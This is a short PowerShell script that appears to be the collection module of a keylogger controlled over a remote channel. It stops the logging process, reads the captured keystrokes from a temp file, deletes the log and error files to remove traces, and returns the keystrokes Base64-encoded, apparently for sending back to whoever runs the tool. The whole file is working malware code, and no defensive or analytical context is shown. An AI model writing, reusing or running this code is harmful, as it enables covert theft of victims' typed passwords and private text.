param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$errorLog = "$env:TEMP\keylog_error_$channelID.txt"

# Kill the process
if (Test-Path $pidFile) {
    $pidRunning = Get-Content $pidFile
    Stop-Process -Id $pidRunning -Force -ErrorAction SilentlyContinue
    Remove-Item $pidFile -Force
}

Start-Sleep -Seconds 2

# If log file exists, return it
if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    Remove-Item $logFile -Force
    Remove-Item $errorLog -Force -ErrorAction SilentlyContinue
    if ($content) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        [System.Convert]::ToBase64String($bytes)
    } else {
        "No keystrokes recorded."
    }
} else {
    # If no log, check for error log
    if (Test-Path $errorLog) {
        $errorMsg = Get-Content $errorLog -Raw
        Remove-Item $errorLog -Force
        "Keylogger error: $errorMsg"
    } else {
        "Keylogger not running."
    }
}